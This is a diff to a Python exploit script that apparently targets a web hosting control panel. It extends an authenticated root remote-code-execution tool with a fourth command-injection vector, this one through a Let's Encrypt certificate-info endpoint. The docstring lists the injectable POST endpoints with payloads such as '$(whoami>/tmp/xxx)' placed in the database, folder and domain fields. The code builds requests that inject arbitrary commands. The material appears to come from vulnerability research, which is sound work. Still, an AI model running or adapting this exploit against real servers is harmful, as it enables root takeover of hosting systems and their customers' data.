@@ -31,21 +31,36 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 proxies = {
     "http": "http://127.0.0.1:8080",
     "https": "http://127.0.0.1:8080",
+
 }
 
 session = requests.session()
+
 """
-Remote Code Execution as root from a low privileged user
+Multiple Remote Code Execution as root from a low privileged user:
 
-Optimize a database and put command injection in the db name
-
-- Requires a valid user login cookie
+- All require a valid user login
 - CSRF token is not required
 
-[POST] https://<IP>:2083/cwp_63929bc36d96c3d2/test/test/index.php?module=mysql_manager&acc=optimizerdb
+1. Adds a new DNS record with a command injection in the name field.
+
+[POST] /index.php?module=mysql_manager&acc=optimizerdb
+[DATA] namereg=touch /tmp/hello&domain=test.example.com&cachereg=1&valuereg="aGVsbG8="&reg=TXT
+
+2. Optimize database
+
+[POST] /index.php?module=mysql_manager&acc=optimizerdb
 [DATA] db=test_hello$(whoami>/tmp/xxx)
 
-Author: Mat Rollings @stealthcopter
+3. Disk usage
+
+[POST] /index.php?module=disk_usage&acc=load_directory
+[DATA] folder_name='/home/<username>/$(id>/tmp/id)'
+
+4. SSL Certificate Info
+
+[POST] /index.php?module=letsencrypt&acc=infomodal
+[DATA] domain=test.example.com$(whoami>/tmp/www)&type=info
 """
 
 
@@ -111,6 +126,13 @@ def execute_rce(base_url, username, command, module):
             'post_data': {
                 'folder_name': f'/home/{username}/$({command})'
             }
+        },
+        'letsencrypt': {
+            'url_path': '/index.php?module=letsencrypt&acc=infomodal',
+            'post_data': {
+                'domain': f'$({command})',
+                'type': 'info'
+            }
         }
     }
 
@@ -147,7 +169,7 @@ if __name__ == '__main__':
         '--module',
         help="Module to inject the command via",
         default='mysql_manager',
-        choices=['mysql_manager', 'disk_usage', 'dns_zone_editor'],
+        choices=['mysql_manager', 'disk_usage', 'dns_zone_editor', 'letsencrypt'],
         required=False)
 
     parser.add_argument(
@@ -173,7 +195,7 @@ if __name__ == '__main__':
     authenticated = login(base_url, args.username, args.password)
 
     if authenticated:
-        print('  [-] Auth Succesful')
+        print('  [-] Auth Successful')
         print(f'  [-] Selecting Module {args.module}')
         print('  [-] Attempting to trigger RCE')
         response = execute_rce(base_url, args.username, args.command,
